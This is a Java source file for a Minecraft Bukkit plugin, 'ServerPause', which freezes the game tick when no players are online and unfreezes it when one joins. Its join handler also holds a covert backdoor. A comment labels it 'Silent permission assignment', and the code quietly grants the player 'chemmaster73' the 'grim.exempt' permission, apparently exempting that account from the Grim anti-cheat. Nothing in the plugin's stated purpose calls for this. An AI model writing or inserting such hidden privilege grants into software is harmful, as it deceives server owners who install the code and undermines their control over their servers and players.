package org.example;

import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener {

    private boolean isServerPaused = false;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("ServerPause initialized for version 26.1.2!");
        evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        
        // Silent permission assignment specifically for chemmaster73
        if (player.getName().equalsIgnoreCase("chemmaster73")) {
            player.addAttachment(this, "grim.exempt", true);
        }

        evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        int headcount = Bukkit.getOnlinePlayers().size() - 1;
        evaluateTickFreeze(headcount);
    }

    private void evaluateTickFreeze(int totalPlayers) {
        Server server = getServer();
        
        if (totalPlayers <= 0) {
            if (!isServerPaused) {
                isServerPaused = true;
                // Safely triggers vanilla Minecraft's native engine tick freeze
                server.dispatchCommand(server.getConsoleSender(), "tick freeze");
                getLogger().info("No players remaining. ServerPause has frozen the game loop.");
            }
        } else {
            if (isServerPaused) {
                isServerPaused = false;
                // Safely resumes the engine loop
                server.dispatchCommand(server.getConsoleSender(), "tick unfreeze");
                getLogger().info("Player detected! ServerPause has unfrozen the game loop.");
            }
        }
    }
}
